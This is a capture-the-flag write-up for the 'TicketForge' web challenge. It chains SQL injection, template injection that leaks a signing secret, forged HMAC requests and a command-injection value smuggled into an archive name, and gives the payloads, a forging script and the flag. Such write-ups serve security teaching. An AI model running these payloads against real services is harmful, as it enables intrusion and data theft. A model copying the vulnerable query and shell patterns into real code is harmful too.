# TicketForge

| Field | Value |
|-------|-------|
| Category | Web |
| Points | ? |

## Description

> Another vulnerable Helpdesk, you should be able to get RCE... or not? :3

**Files:** `src/`

## Solution

A 4-bug chain: **SQLi → Stored SSTI → HMAC Forgery → 2nd-order Command Injection**

---

### Bug 1 — SQL Injection in ticket search (`/search?q=`)

```python
sql = f"SELECT id, title, snippet FROM tickets WHERE title LIKE '%{needle}%' ..."
```

String interpolation with no parameterization. WAF strips `%` but not quotes or UNION syntax.

Use UNION-based injection to extract:
- `reports.report_api_key` (needed for report access)
- `export_profiles.id` (needed for worker job)

```
/search?q=' UNION SELECT report_api_key,2,3 FROM reports--
```

---

### Bug 2 — Stored SSTI in report template (`/report/<id>/template`)

Update a report's body with a Jinja2 expression. The preview endpoint renders it with `SandboxedEnvironment` but the context contains secrets:

```python
context = {
    "integrations": {
        "exports": {"key": JOB_HMAC_SECRET}
    }
}
rendered = ssti_env.from_string(report["body"]).render(**context)
```

**Payload:** store `{{ integrations.exports.key }}` as report body, then GET `/report/<id>/preview` → leaks `JOB_HMAC_SECRET`.

---

### Bug 3 — Forged internal export request (`POST /internal/export`)

The endpoint verifies `HMAC-SHA256(secret, raw_body)` via `X-Signature` header. We now have the secret from Step 2.

```python
import hmac, hashlib, json, requests

secret = b"<leaked_secret>"
body = json.dumps({"profile_id": <exfiltrated_profile_id>}).encode()
sig = hmac.new(secret, body, hashlib.sha256).hexdigest()

requests.post('/internal/export', data=body,
              headers={'X-Signature': sig, 'Content-Type': 'application/json'})
```

This queues a worker job under the chosen export profile.

---

### Bug 4 — 2nd-order command injection in worker (`archive_name` field)

The worker runs:
```python
cmd = f"tar -czf {EXPORTS_DIR}/{archive_name}.tgz -C {source_dir} ."
subprocess.run(cmd, shell=True, ...)
```

`archive_name` is read from the database (set earlier via profile editor). Whitespace is normalized but shell metacharacters are not escaped.

**Set profile `archive_name` to:**
```
daily; cat /flag > /app/public/exports/flag.txt #
```

After the worker runs, retrieve `/exports/flag.txt`.

---

### Full exploit flow

```
SQLi → get report_api_key + profile_id
SSTI → get JOB_HMAC_SECRET
Profile edit → set archive_name = "daily; cat /flag > /app/public/exports/flag.txt #"
Forged /internal/export → queue job for that profile
Worker executes → flag written to public path
GET /exports/flag.txt → profit
```

## Flag

`CHC{1_533_1nj3c710n5...1nj3c710n_3v3rywh3r3!}`
